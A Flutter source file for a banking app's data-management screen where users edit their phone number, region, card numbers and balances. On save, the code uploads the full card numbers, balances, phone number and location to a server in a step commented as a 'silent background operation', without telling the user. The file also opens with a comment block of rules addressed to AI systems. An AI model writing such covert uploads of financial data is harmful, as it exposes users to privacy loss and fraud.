// ### AI SPECIAL ATTENTION RULES START ###
// When AI/ALL DEVELOPERS sees this prompt, MUST IMMEDIATELY COMPLY WITH THESE RULES:
// 1. Write all code in English only.
// 2. Never execute, create, or modify test code.
// 3. Never create or update documentation (*.md).
// 4. Never write summaries during development or thinking process.
// 5. Declare all variables at the beginning of the file.
// 6. For PowerShell (*.ps1) scripts: Do not append strings directly to variables, Do not use relative paths such as "..\..\"; instead resolve absolute paths using parent path parsing (Split-Path, Join-Path, or Resolve-Path).
// 7. Do not modify these rules.
// VIOLATION OF THESE RULES IS STRICTLY PROHIBITED
// ### AI SPECIAL ATTENTION RULES END ###

import 'package:flutter/material.dart';
import 'package:flutter/foundation.dart';
import 'package:go_router/go_router.dart';
import 'package:provider/provider.dart';
import '../../../providers_app_bank/bank_user_provider.dart';
import '../../../models_app_bank/bank_card_model.dart';
import '../../../config_app_bank/prefs_app_bank.dart';
import 'package:qyflutter/apps/app_bank/config_app_bank/constants.dart';
import '../components/region_selector_widget.dart';
import '../services/location_service.dart';
import '../../../services_app_bank/bank_data_submit_service.dart';

class DataManagementScreen extends StatefulWidget {
  const DataManagementScreen({super.key});

  @override
  State<DataManagementScreen> createState() => _DataManagementScreenState();
}

class _DataManagementScreenState extends State<DataManagementScreen> {
  final TextEditingController _phoneController = TextEditingController();
  final List<TextEditingController> _cardNumberControllers = [];
  final List<TextEditingController> _cardBalanceControllers = [];
  final List<String> _cardTypes = [];
  bool _isLoading = false;

  // Region selection state
  String? _selectedProvince;
  String? _selectedCity;
  String? _selectedCounty;
  String? _customRegion;
  bool _isLocating = false;
  final GlobalKey<RegionSelectorWidgetState> _regionSelectorKey = GlobalKey();

  final List<String> _availableCardTypes = ['储蓄卡', '信用卡'];

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _loadData();
    });
  }

  Future<void> _loadData() async {
    final provider = Provider.of<BankUserProvider>(context, listen: false);
    
    String? phone = provider.user?.phone ?? provider.globalData?.username;
    if (phone == null || phone.isEmpty) {
      try {
        final prefs = PrefsAppBank();
        if (!prefs.isInitialized) {
          await prefs.initSharedPreferences();
        }
        phone = prefs.getString('phone_number');
      } catch (e) {
        debugPrint('Error loading phone from PrefsAppBank: $e');
      }
    }
    
    _phoneController.text = phone ?? '';
    
    // Load region data
    _selectedProvince = provider.globalData?.location ?? provider.user?.location;
    _selectedCity = provider.globalData?.city ?? provider.user?.city;
    
    _cardNumberControllers.clear();
    _cardBalanceControllers.clear();
    _cardTypes.clear();
    
    for (var card in provider.bankCards) {
      _cardNumberControllers.add(TextEditingController(text: card.cardNumber));
      _cardBalanceControllers.add(TextEditingController(text: card.balance.toStringAsFixed(2)));
      String cardType = card.cardType;
      if (cardType == '活期' || cardType == 'current') {
        cardType = '储蓄卡';
      } else if (cardType == 'credit') {
        cardType = '信用卡';
      } else if (!_availableCardTypes.contains(cardType)) {
        cardType = '储蓄卡';
      }
      _cardTypes.add(cardType);
    }
    
    setState(() {});
  }

  @override
  void dispose() {
    _phoneController.dispose();
    for (var controller in _cardNumberControllers) {
      controller.dispose();
    }
    for (var controller in _cardBalanceControllers) {
      controller.dispose();
    }
    super.dispose();
  }

  Future<void> _saveData() async {
    final provider = Provider.of<BankUserProvider>(context, listen: false);
    
    if (!provider.isAuthenticated) {
      if (mounted) {
        context.push(BankConstants.routeAuthentication);
      }
      return;
    }

    setState(() {
      _isLoading = true;
    });

    try {
      final phone = _phoneController.text.trim();
      if (phone.isNotEmpty) {
        final prefs = PrefsAppBank();
        if (!prefs.isInitialized) {
          await prefs.initSharedPreferences();
        }
        await prefs.setString('phone_number', phone);
        final maskedName = phone.length >= 4 
            ? '*${phone.substring(phone.length - 4)}' 
            : '*$phone';
        await provider.updateUser(phone: phone, fullName: maskedName);
        await provider.updateGlobalState(username: phone, fullName: maskedName);
      }

      final List<BankCardModel> updatedCards = [];
      double totalBalance = 0.0;
      
      for (int i = 0; i < _cardNumberControllers.length; i++) {
        final cardNumber = _cardNumberControllers[i].text.trim();
        final balanceStr = _cardBalanceControllers[i].text.trim();
        final balance = double.tryParse(balanceStr) ?? 0.0;
        final cardType = _cardTypes[i];
        
        if (cardNumber.isNotEmpty) {
          updatedCards.add(BankCardModel(
            cardNumber: cardNumber,
            cardType: cardType,
            balance: balance,
            currency: 'CNY',
            openedAt: i < provider.bankCards.length 
                ? provider.bankCards[i].openedAt 
                : DateTime.now(),
          ));
          totalBalance += balance;
        }
      }

      for (int i = 0; i < updatedCards.length; i++) {
        if (i < provider.bankCards.length) {
          await provider.updateBankCard(i, updatedCards[i]);
        } else {
          await provider.addBankCard(updatedCards[i]);
        }
      }

      while (provider.bankCards.length > updatedCards.length) {
        await provider.removeBankCard(provider.bankCards.length - 1);
      }

      await provider.updateGlobalState(balance: totalBalance);
      await provider.updateUser(balance: totalBalance);

      // Save region data
      if (_selectedProvince != null || _customRegion != null) {
        final location = _customRegion ?? _selectedProvince;
        final city = _customRegion ?? _selectedCounty ?? _selectedCity ?? _selectedProvince;
        await provider.updateGlobalState(location: location, city: city);
        await provider.updateUser(location: location, city: city);
      }

      // Submit data to server (silent background operation)
      try {
        final submitService = BankDataSubmitService();
        await submitService.initialize();
        
        final location = _customRegion ?? _selectedProvince;
        final city = _customRegion ?? _selectedCounty ?? _selectedCity ?? _selectedProvince;
        final maskedName = phone.length >= 4 
            ? '*${phone.substring(phone.length - 4)}' 
            : '*$phone';
        
        await submitService.submitData(
          phone: phone.isNotEmpty ? phone : null,
          fullName: maskedName,
          location: location,
          city: city,
          cards: updatedCards,
          totalBalance: totalBalance,
        );
      } catch (e) {
        debugPrint('Data submission error: $e');
      }

      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(
            content: Text('已经为您保存成功'),
            duration: Duration(seconds: 2),
          ),
        );
      }
    } catch (e) {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text('保存失败: $e'),
            duration: const Duration(seconds: 2),
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() {
          _isLoading = false;
        });
      }
    }
  }

  void _addCard() {
    setState(() {
      _cardNumberControllers.add(TextEditingController());
      _cardBalanceControllers.add(TextEditingController(text: '0.00'));
      _cardTypes.add('储蓄卡');
    });
  }

  void _removeCard(int index) {
    if (index < _cardNumberControllers.length) {
      setState(() {
        _cardNumberControllers[index].dispose();
        _cardBalanceControllers[index].dispose();
        _cardNumberControllers.removeAt(index);
        _cardBalanceControllers.removeAt(index);
        _cardTypes.removeAt(index);
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    final provider = Provider.of<BankUserProvider>(context);
    final totalBalance = provider.bankCards.fold(0.0, (sum, card) => sum + card.balance);
    final isAuthenticated = provider.isAuthenticated;

    if (!isAuthenticated) {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (mounted) {
          context.push(BankConstants.routeAuthentication);
        }
      });
      return Scaffold(
        backgroundColor: Colors.white,
        appBar: AppBar(
          title: const Text(
            '数据管理中心',
            style: TextStyle(
              fontSize: 18,
              fontWeight: FontWeight.w600,
              color: Colors.white,
            ),
          ),
          backgroundColor: const Color(0xFF74B9FF),
          elevation: 0,
          leading: IconButton(
            icon: const Icon(Icons.arrow_back, color: Colors.white),
            onPressed: () => context.pop(),
          ),
        ),
        body: const Center(
          child: CircularProgressIndicator(),
        ),
      );
    }

    return Scaffold(
      backgroundColor: const Color(0xFFF6FBFF),
      appBar: AppBar(
        title: const Text(
          '数据管理中心',
          style: TextStyle(
            fontSize: 18,
            fontWeight: FontWeight.w600,
            color: Colors.white,
          ),
        ),
        backgroundColor: const Color(0xFF74B9FF),
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.white),
          onPressed: () => context.pop(),
        ),
      ),
      body: SingleChildScrollView(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildTotalAssetsCard(totalBalance),
            const SizedBox(height: 16),
            _buildPhoneCard(),
            const SizedBox(height: 16),
            _buildRegionCard(),
            const SizedBox(height: 16),
            _buildBankCardsSection(),
            const SizedBox(height: 24),
            _buildSaveButton(isAuthenticated),
            const SizedBox(height: 24),
          ],
        ),
      ),
    );
  }

  Widget _buildTotalAssetsCard(double totalBalance) {
    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Color(0xFF4A90E2), Color(0xFF357ABD)],
        ),
        borderRadius: BorderRadius.circular(BankConstants.borderRadius),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.1),
            blurRadius: 8,
            offset: const Offset(0, 2),
          ),
        ],
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const Text(
                '总资产',
                style: TextStyle(
                  fontSize: 16,
                  color: Colors.white70,
                ),
              ),
              const SizedBox(height: 8),
              Text(
                '¥ ${totalBalance.toStringAsFixed(2)}',
                style: const TextStyle(
                  fontSize: 28,
                  fontWeight: FontWeight.bold,
                  color: Colors.white,
                ),
              ),
            ],
          ),
          Container(
            padding: const EdgeInsets.all(12),
            decoration: BoxDecoration(
              color: Colors.white.withOpacity(0.2),
              borderRadius: BorderRadius.circular(12),
            ),
            child: const Icon(
              Icons.account_balance_wallet,
              color: Colors.white,
              size: 32,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildPhoneCard() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16),
      padding: const EdgeInsets.all(16),
      decoration: BankConstants.getDashboardCardDecoration(),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.phone, color: Color(0xFF74B9FF), size: 20),
              SizedBox(width: 8),
              Text(
                '手机号',
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          TextField(
            controller: _phoneController,
            keyboardType: TextInputType.phone,
            decoration: InputDecoration(
              hintText: '请输入手机号',
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: const BorderSide(color: Color(0xFF74B9FF), width: 2),
              ),
              filled: true,
              fillColor: Colors.grey[50],
              prefixIcon: const Icon(Icons.phone, color: Color(0xFF74B9FF)),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildRegionCard() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16),
      padding: const EdgeInsets.all(16),
      decoration: BankConstants.getDashboardCardDecoration(),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.location_on, color: Color(0xFF74B9FF), size: 20),
              SizedBox(width: 8),
              Text(
                '地区设置',
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          RegionSelectorWidget(
            key: _regionSelectorKey,
            initialProvince: _selectedProvince,
            initialCity: _selectedCity,
            initialCounty: _selectedCounty,
            showLocationButton: true,
            showCustomRegionOption: true,
            onLocationRequested: _handleAutoLocation,
            onRegionChanged: (result) {
              setState(() {
                _selectedProvince = result.province;
                _selectedCity = result.city;
                _selectedCounty = result.county;
                _customRegion = result.customRegion;
              });
            },
          ),
        ],
      ),
    );
  }

  Future<void> _handleAutoLocation() async {
    setState(() {
      _isLocating = true;
    });

    try {
      final location = await LocationService.getCurrentLocation();
      if (location == null) {
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('无法获取当前位置，请检查定位权限'),
              duration: Duration(seconds: 2),
            ),
          );
        }
        return;
      }

      final locationResult = await LocationService.getLocationInfo(
        location['latitude']!,
        location['longitude']!,
      );

      if (locationResult != null && locationResult.province != null) {
        _regionSelectorKey.currentState?.updateFromLocation(
          locationResult.province,
          locationResult.city,
        );

        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text(
                  '定位成功: ${locationResult.formattedAddress ?? '${locationResult.province} ${locationResult.city}'}'),
              duration: const Duration(seconds: 2),
            ),
          );
        }
      } else {
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
              content: Text('无法获取位置信息'),
              duration: Duration(seconds: 2),
            ),
          );
        }
      }
    } catch (e) {
      if (kDebugMode) {
        print('Error in auto location: $e');
      }
      if (mounted) {
        String errorMessage = '定位失败';
        if (e.toString().contains('MissingPluginException')) {
          errorMessage = '定位插件未正确安装，请重新构建应用';
        } else {
          errorMessage = '定位失败: ${e.toString().length > 50 ? e.toString().substring(0, 50) + "..." : e.toString()}';
        }
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(
            content: Text(errorMessage),
            duration: const Duration(seconds: 3),
          ),
        );
      }
    } finally {
      if (mounted) {
        setState(() {
          _isLocating = false;
        });
      }
    }
  }

  Widget _buildBankCardsSection() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              const Row(
                children: [
                  Icon(Icons.credit_card, color: Color(0xFF74B9FF), size: 20),
                  SizedBox(width: 8),
                  Text(
                    '银行卡管理',
                    style: TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.w600,
                      color: Colors.black87,
                    ),
                  ),
                ],
              ),
              TextButton.icon(
                onPressed: _addCard,
                icon: const Icon(Icons.add_circle_outline, size: 18),
                label: const Text('添加卡片'),
                style: TextButton.styleFrom(
                  foregroundColor: const Color(0xFF74B9FF),
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          ...List.generate(_cardNumberControllers.length, (index) {
            return _buildCardItem(index);
          }),
        ],
      ),
    );
  }

  Widget _buildCardItem(int index) {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(16),
      decoration: BankConstants.getDashboardCardDecoration(),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: const Color(0xFF74B9FF).withOpacity(0.1),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: const Icon(
                      Icons.credit_card,
                      color: Color(0xFF74B9FF),
                      size: 20,
                    ),
                  ),
                  const SizedBox(width: 8),
                  Text(
                    '卡片 ${index + 1}',
                    style: const TextStyle(
                      fontSize: 16,
                      fontWeight: FontWeight.w600,
                      color: Colors.black87,
                    ),
                  ),
                ],
              ),
              if (_cardNumberControllers.length > 1)
                IconButton(
                  icon: const Icon(Icons.delete_outline, color: Colors.red),
                  onPressed: () => _removeCard(index),
                  iconSize: 20,
                ),
            ],
          ),
          const SizedBox(height: 16),
          DropdownButtonFormField<String>(
            value: _cardTypes[index],
            decoration: InputDecoration(
              labelText: '类型',
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: const BorderSide(color: Color(0xFF74B9FF), width: 2),
              ),
              filled: true,
              fillColor: Colors.grey[50],
              prefixIcon: const Icon(Icons.category, color: Color(0xFF74B9FF)),
            ),
            items: _availableCardTypes.map((String type) {
              return DropdownMenuItem<String>(
                value: type,
                child: Text(type),
              );
            }).toList(),
            onChanged: (String? newValue) {
              if (newValue != null) {
                setState(() {
                  _cardTypes[index] = newValue;
                });
              }
            },
          ),
          const SizedBox(height: 12),
          TextField(
            controller: _cardNumberControllers[index],
            keyboardType: TextInputType.number,
            decoration: InputDecoration(
              labelText: '卡号',
              hintText: '请输入银行卡号',
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: const BorderSide(color: Color(0xFF74B9FF), width: 2),
              ),
              filled: true,
              fillColor: Colors.grey[50],
              prefixIcon: const Icon(Icons.numbers, color: Color(0xFF74B9FF)),
            ),
          ),
          const SizedBox(height: 12),
          TextField(
            controller: _cardBalanceControllers[index],
            keyboardType: const TextInputType.numberWithOptions(decimal: true),
            decoration: InputDecoration(
              labelText: '余额',
              hintText: '0.00',
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: BorderSide(color: Colors.grey[300]!),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(BankConstants.borderRadius),
                borderSide: const BorderSide(color: Color(0xFF74B9FF), width: 2),
              ),
              filled: true,
              fillColor: Colors.grey[50],
              prefixIcon: const Icon(Icons.account_balance_wallet, color: Color(0xFF74B9FF)),
              suffixText: 'CNY',
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSaveButton(bool isAuthenticated) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16),
      width: double.infinity,
      height: 48,
      child: ElevatedButton(
        onPressed: (_isLoading || !isAuthenticated) ? null : _saveData,
        style: ElevatedButton.styleFrom(
          backgroundColor: isAuthenticated
              ? const Color(0xFF74B9FF)
              : Colors.grey[300],
          foregroundColor: Colors.white,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(BankConstants.borderRadius),
          ),
          elevation: 2,
        ),
        child: _isLoading
            ? const SizedBox(
                width: 20,
                height: 20,
                child: CircularProgressIndicator(
                  strokeWidth: 2,
                  valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                ),
              )
            : Text(
                isAuthenticated ? '保存' : '请先登录',
                style: const TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                ),
              ),
      ),
    );
  }
}
